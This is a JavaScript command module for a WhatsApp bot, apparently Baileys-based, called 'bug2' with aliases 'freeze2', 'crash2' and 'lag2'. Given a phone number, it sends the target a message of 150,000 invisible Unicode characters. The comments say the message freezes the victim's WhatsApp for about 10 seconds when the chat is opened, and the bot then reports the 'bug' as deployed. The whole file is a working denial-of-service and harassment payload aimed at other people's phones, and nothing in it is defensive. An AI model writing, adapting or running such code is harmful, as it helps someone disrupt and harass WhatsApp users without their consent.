const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'bug2',
    aliases: ['freeze2', 'crash2', 'lag2'],
    category: 'owner',
    description: 'Send a heavy invisible message that freezes the target WhatsApp for 10 seconds',
    usage: '.bug2 <number>',
    ownerOnly: true,
    react: '💣',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}bug2 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `💣 *Deploying Heavy Bug to +${targetNum}...*` }, { quoted: mek });

        try {
            // The "Freeze" payload: A massive string of invisible Unicode characters
            // 150,000 characters will force WhatsApp to freeze for ~10 seconds while rendering
            const invisible = '\u200E';
            const payload = invisible.repeat(150000); 

            // Send the payload
            await conn.sendMessage(jid, { text: payload });
            
            await conn.sendMessage(chatId, { text: `✅ *Heavy Bug Deployed!*\n\nThe target's WhatsApp should freeze for about 10 seconds when they open the chat.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[BUG2] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deploy bug: ${error.message}` }, { quoted: mek });
        }
    }
};